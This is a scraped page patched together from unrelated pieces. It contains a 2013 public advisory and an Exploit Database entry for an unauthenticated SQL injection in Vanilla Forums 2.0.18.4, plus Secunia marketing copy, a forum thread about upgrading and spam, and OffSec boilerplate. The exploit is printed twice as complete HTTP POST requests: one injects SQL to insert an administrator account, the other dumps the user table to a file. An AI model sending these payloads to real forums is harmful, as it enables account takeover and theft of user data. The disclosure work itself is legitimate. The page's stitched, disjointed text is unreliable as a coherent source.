# Vanilla Forums 2.0.18 / SQL-Injection / Insert arbitrary user & dump usertable

---

*From*: "Ing. Michael F. Schratt, MSc" <mschratt () mfs-enterprise com>

*Date*: Sun, 7 Apr 2013 14:42:36 +0200

```
Product Name:
        Vanilla Forums

Vulnerable Version:
        Up to vanilla-core-2-0-18-4

Tested on:
        Windows Server 2003
        Apache 2.4.3
        PHP 5.4.7
        MySQL 5.5.27

Vulnerability Overview:
        SQL-Injection is possible, because$_POST arrays are not proper
sanitized.
        You do not need to be authenticated.

 Vulnerability Details:
        To insert an arbitrary user, a sample HTTP-Post Request looks as
follows:

        POST /[PATH]/vanilla/entry/signin HTTP/1.1
        Host: [HOST]
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0)
Gecko/20100101 Firefox/19.0
        Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Cookie: [any cookie]
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 399

Form%2FTransientKey=VQYSOG2F3D38&Form%2Fhpt=&Form%2FTarget=discussions&
        Form%2FClientHour=2013-3-28+11%3A37&Form%2FEmail['admin';INSERT INTO
gdn_user
        (UserID, Name, Password, HashMethod, DateInserted, Admin,
Permissions)
        VALUES (NULL, '1234', '$P$BayO4QrMb9wgzdjNhlUBWdQcVaMnKN0',
'Vanilla',
        '2013-03-28 00:00:00', '1',
'');#]=abcd&Form%2FPassword=*&Form%2FSign_In=
        Sign+In&Checkboxes%5B%5D=RememberMe

        Indeed you has to take care of the proper encryption algorithm which
is currently used.
        As it is not possible to get the user table displayed on the
website, you could establish an attack as follows:

        POST /[PATH]/vanilla/entry/passwordrequest HTTP/1.1
        Host: [HOST]
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0)
Gecko/20100101 Firefox/19.0
        Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 255

Form%2FTransientKey=OJS6EB1J0KW7&Form%2Fhpt=&Form%2FEmail['ac';select *
        from gdn_user into outfile '[FULL_PATH]\\vanilla\\out.txt' #]=13&
        Form%2FRequest_a_new_password=Request+a+new+password

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Even though Vanilla 2.1 is just around the corner we are still supporting 2.0.18.\* installations.

  [@Todd](https://open.vanillaforums.com/profile/Todd) are the links to the single file and raw downloads correct. The date of the revisions shows it to be two years old or I am missing a concept.

  it looks like what x00 posted is indeed the change needed for just a single file.

  One can also just download the 2.018.8 package and only take that file to switch it out right?

  I would really love the option to update just the files that have changed between versions. anyone knows a simple trick or can you Vanillas provide a repo with just those changed?

  Why? I guess a lot of people who had to code into the core to make language modifications that were not covered by the locale (quite a lot sind 2.0.X) could upgrade way easier that way.

  I now use a comparison tool, but that is also not the most easiest to make those files out.

  [@phreak](https://open.vanillaforums.com/profile/phreak) just replace the **class.sqldriver.php** , download the whole package then ftp to overwrite the file into

  forum/library/database

  Nothing broke when I did that so it should be fine did it to several other installations.

  Hi, I am running 2.0.18.4. What are the upgrade procedures from 2.0.18.4 to 2.0.18.8 (apart from backing up ![:)](https://open.vanillaforums.com/plugins/emojiextender/emoji/little/smile.png ":)") )?

  I ask because here, <http://vanillaforums.org/addon/vanilla-core> , I can see that 2.0.18.7 has also been released . Should I install 2.0.18.7 first and then 2.0.18.8? Or will the 2.0.18.8 package take care of everything?

  Backup everything. Overwrite your 2.0.18.4 files with the ones from 2.0.18.8 You don't need to install 2.0.18.7

  There was an error rendering this rich post.

  Git is exactly for this kind of thing. You fork our repo and make your changes and then merge when we do a release.

  So no one has a changelog for 2.0.18.7? I could go through the GitHub commit log but something more readable would be nice...

  By the way, the ".gitignore" file is being included in the releases

  [@Subjunk](https://open.vanillaforums.com/profile/Subjunk), I added the log to the original post.

  Wrt the .gitignore, I'm just doing the release via git archive which is a bit nicer imo. The .gitignore is just a small side-effect of that.

  I think there is still a major security flaw in 2.0.18.8.

  I always have kept my forum in approval mode. I manually approve every new member. Like many, I had problems with bots spamming the application form, but none of them got through to become members.

  About a month ago, the application spam was significantly reduced. I figured the bots gave up. Apparently they didn't. They just found a way to bypass the application and become members. I went through and deleted all the bad users. There were only 100 or so, so I used SQL to delete them and their content.

  My forum is fully upgraded, so there is definitely still something fishy going on. Also, it would be nice if there was a user interface that allowed deleting users in bulk, so it's easier to recover from those cases where spam does get through. Trying to do it by hand one at a time in the Dashboard was awful having to go through those extra confirmation pages.

  I have entirely disabled new applicants to my forum until this issues is resolved.

# Exploit Title: Vanilla Forums - SQL-Injection - Insert arbitrary user & dump usertable
# Date: 04/05/2013
# Exploit Author: bl4ckw0rm
# Vendor Homepage: http://vanillaforums.org/
# Version: 2-0-18-4
# Tested on: Windows

Product Name:

Vanilla Forums

Vulnerable Version:

Up to vanilla-core-2-0-18-4

Tested on:

Windows Server 2003
Apache 2.4.3
PHP 5.4.7
MySQL 5.5.27

Vulnerability Overview:

SQL-Injection is possible, because$_POST arrays are not proper sanitized.
You do not need to be authenticated.

Vulnerability Details:

To insert an arbitrary user, a sample HTTP-Post Request looks as follows:

POST /[PATH]/vanilla/entry/signin HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: [any cookie]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 399

Form%2FTransientKey=VQYSOG2F3D38&Form%2Fhpt=&Form%2FTarget=discussions&
Form%2FClientHour=2013-3-28+11%3A37&Form%2FEmail['admin';INSERT INTO gdn_user
(UserID, Name, Password, HashMethod, DateInserted, Admin, Permissions)
VALUES (NULL, '1234', '$P$BayO4QrMb9wgzdjNhlUBWdQcVaMnKN0', 'Vanilla',
'2013-03-28 00:00:00', '1', '');#]=abcd&Form%2FPassword=*&Form%2FSign_In=
Sign+In&Checkboxes%5B%5D=RememberMe

Indeed you has to take care of the proper encryption algorithm which is currently used.

As it is not possible to get the user table displayed on the website, you could establish an attack as follows:

POST /[PATH]/vanilla/entry/passwordrequest HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 255

Form%2FTransientKey=OJS6EB1J0KW7&Form%2Fhpt=&Form%2FEmail['ac';select *
from gdn_user into outfile '[FULL_PATH]\\vanilla\\out.txt' #]=13&
Form%2FRequest_a_new_password=Request+a+new+password

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
